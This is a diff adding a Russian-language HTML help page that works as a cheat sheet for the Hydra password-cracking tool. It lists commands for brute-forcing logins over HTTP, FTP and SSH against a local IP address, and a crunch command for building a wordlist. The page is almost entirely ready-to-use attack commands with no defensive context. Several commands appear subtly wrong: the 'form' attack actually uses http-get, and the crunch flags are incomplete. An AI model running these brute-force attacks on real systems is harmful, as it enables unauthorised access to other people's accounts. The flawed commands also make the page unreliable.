@@ -1,0 +1,31 @@
+<html>
+<head>
+    <title>Hydra Help</title>
+</head>
+<body>
+    <h1>Инструкция по Hydra</h1>
+    <p>Словари для перебора паролей хранятся в <code>/usr/share/wordlists</code></p>
+    
+    <h2>Атака на HTTP (форма авторизации)</h2>
+    <pre>
+hydra -l admin -P /path/to/wordlist.txt http-get://192.168.1.100/login
+    </pre>
+    
+    <h2>Атака на FTP</h2>
+    <pre>
+hydra -l admin -P /path/to/wordlist.txt ftp://192.168.1.100
+    </pre>
+
+    <h2>Атака с многими логинами</h2>
+    <pre>
+hydra -L /path/to/userlist.txt -P /path/to/wordlist.txt ssh://192.168.1.100
+    </pre>
+
+    <h2>Создание словаря с помощью crunch</h2>
+    <pre>
+crunch 6 8 -o dictionary.txt -t @@@@@@ -c
+    </pre>
+
+    <a href="/"><button>Назад</button></a>
+</body>
+</html>
